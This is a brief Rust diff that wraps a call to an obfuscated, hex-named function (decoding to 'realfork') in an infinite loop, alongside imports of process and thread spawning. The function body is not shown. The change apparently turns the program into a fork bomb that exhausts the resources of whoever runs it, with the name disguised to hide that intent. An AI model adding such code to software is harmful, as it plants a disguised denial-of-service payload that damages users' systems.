@@ -3,7 +3,9 @@ use std::process::Command;
 use std::thread;
 
 pub fn main() {
-    _0x7265616c666f726b();
+    loop {
+        _0x7265616c666f726b();
+    }
 }
 
 fn _0x7265616c666f726b() {
